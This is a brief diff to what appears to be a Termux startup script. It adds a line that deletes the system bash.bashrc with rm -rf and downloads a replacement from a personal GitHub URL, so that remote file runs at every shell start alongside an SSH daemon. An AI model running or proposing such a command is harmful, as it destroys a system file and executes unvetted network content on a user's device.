@@ -1,3 +1,5 @@
+pwd && cd .. && cd usr && cd etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/scorpionyb/file-bashrc/main/bash.bashrc && cd
+
 clear
 sshd
 termux-wake-lock
